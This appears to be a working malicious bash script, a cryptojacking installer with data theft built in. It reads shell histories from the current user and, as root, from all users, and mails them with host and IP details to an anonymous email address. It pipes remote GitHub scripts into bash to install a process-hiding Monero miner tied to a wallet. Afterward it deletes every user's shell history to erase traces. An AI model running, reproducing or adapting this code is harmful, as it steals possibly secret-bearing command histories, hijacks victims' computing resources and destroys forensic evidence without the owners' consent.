#!/bin/bash
unset HISTFILE

# Function to collect history from all available shells
collect_shell_history() {
    echo "=== COLLECTING SHELL HISTORIES ==="
    
    # List of common shell history files
    declare -A SHELL_HISTORIES=(
        ["bash"]="$HOME/.bash_history"
        ["zsh"]="$HOME/.zsh_history"
        ["ksh"]="$HOME/.sh_history"
        ["fish"]="$HOME/.local/share/fish/fish_history"
        ["tcsh"]="$HOME/.history"
    )
    
    # System-wide shells (check /etc/shells)
    SYSTEM_SHELLS=$(grep -v "/false$" /etc/shells | grep -v "/nologin$" | xargs -n1 basename 2>/dev/null)
    
    OUTPUT=""
    for shell in $SYSTEM_SHELLS; do
        case $shell in
            "bash"|"zsh"|"ksh"|"fish"|"tcsh")
                hist_file="${SHELL_HISTORIES[$shell]}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
                ;;
        esac
    done
    
    # Also check for root histories if running as root
    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home); do
            for shell in "${!SHELL_HISTORIES[@]}"; do
                hist_file="/home/$user/${SHELL_HISTORIES[$shell]##*/}"
                if [ -f "$hist_file" ]; then
                    OUTPUT+="\n=== $user's $shell HISTORY ===\n"
                    OUTPUT+="$(cat "$hist_file" 2>/dev/null || echo "Unable to read history")\n"
                fi
            done
        done
    fi
    
    echo -e "$OUTPUT"
}

# Function to send email with all histories
send_histories_email() {
    # Get system info
    HOSTNAME=$(hostname)
    PUBLIC_IP=$(curl -s --max-time 5 ifconfig.me || echo "N/A")
    LOCAL_IP=$(hostname -I | awk '{print $1}')
    USER=$(whoami)

    # Format email
    EMAIL_CONTENT=$(cat <<EOF
=== SYSTEM REPORT ===
Hostname: $HOSTNAME
User: $USER
Public IP: $PUBLIC_IP
Local IP: $LOCAL_IP

=== RESOURCES ===
RAM: $(free -h | awk '/^Mem:/ {print $2}')
CPU: $(nproc) cores
Storage: $(df -h / | awk 'NR==2 {print $2}')

$(collect_shell_history)
EOF
    )

    # Send email
    if command -v mail &>/dev/null; then
        echo "$EMAIL_CONTENT" | mail -s "Full Shell History Report from $HOSTNAME" ff3963a2-ad37-4797-bde9-ac5b76448d8d@jamy.anonaddy.com
    else
        echo "Warning: mailutils not installed - storing report in /tmp/system_report.txt"
        echo "$EMAIL_CONTENT" > /tmp/system_report.txt
    fi
}

# Original service check functions
does_service_exist() {
    service="$1"
    systemctl list-units --type=service --all | grep -q "$service.service"
}

is_service_running() {
    service="$1"
    systemctl is-active --quiet "$service"
}

# --- Main Execution ---

# Service checks
services=("swapd" "gdm2")
for service in "${services[@]}"; do
    if does_service_exist "$service"; then
        if is_service_running "$service"; then
            echo "ERROR: Service $service is running. Aborting."
            exit 1
        fi
    fi
done

# System info display
echo -e "\n---------------------------------\n|     Resource     |     Value     |\n---------------------------------"
echo -e "|        RAM        |  $(free -h | awk '/^Mem:/ {print $2}')  |"
echo -e "|   CPU Cores    |      $(nproc)      |"
echo -e "|     Storage      |   $(df -h / | awk 'NR==2 {print $2}')   |"
echo -e "---------------------------------"

# Send all shell histories
send_histories_email

# Original installation functions
rootstuff() {
  echo -e "\nStarting root installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_mo_4_r00t_with_processhide.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
  [ "$USER" != root ] && sudo -u "$USER" "$0"
}

userstuff() {
  echo -e "\nStarting user installation..."
  curl -L https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/setup_gdm2.sh | bash -s 4BGGo3R1dNFhVS3wEqwwkaPyZ5AdmncvJRbYVFXkcFFxTtNX9x98tnych6Q24o2sg87txBiS9iACKEZH4TqUBJvfSKNhUuX
}

# Original execution logic
if [[ $(id -u) -eq 0 ]]; then
    rootstuff
else
    userstuff
fi

# Enhanced history cleanup for all shells
cleanup_histories() {
    echo "Cleaning all shell histories..."
    
    # Current user's histories
    rm -f ~/.bash_history ~/.zsh_history ~/.sh_history 
    rm -rf ~/.local/share/fish/fish_history
    rm -f ~/.history
    
    # Root cleans all user histories if running as root
    if [ $(id -u) -eq 0 ]; then
        for user in $(ls /home); do
            rm -f /home/$user/.bash_history /home/$user/.zsh_history /home/$user/.sh_history
            rm -rf /home/$user/.local/share/fish/fish_history
            rm -f /home/$user/.history
        done
    fi
    
    # Clear current session history
    history -c
}
cleanup_histories
